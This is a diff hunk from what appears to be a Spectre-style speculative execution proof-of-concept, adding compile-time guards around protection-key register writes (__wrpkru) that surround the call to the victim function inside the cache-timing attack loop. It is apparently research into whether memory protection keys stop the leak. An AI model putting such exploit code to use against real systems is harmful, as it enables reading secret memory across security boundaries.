@@ -187,9 +187,13 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       x = training_x ^ (x & (malicious_x ^ training_x));
 
       /* Call the victim! */
+#ifndef TRAINOUTSIDE
       __wrpkru((0x55555550));
+#endif
       victim_function(x);
+#ifndef TRAINOUTSIDE
       __wrpkru((0x5555555C));
+#endif
 
     }
 
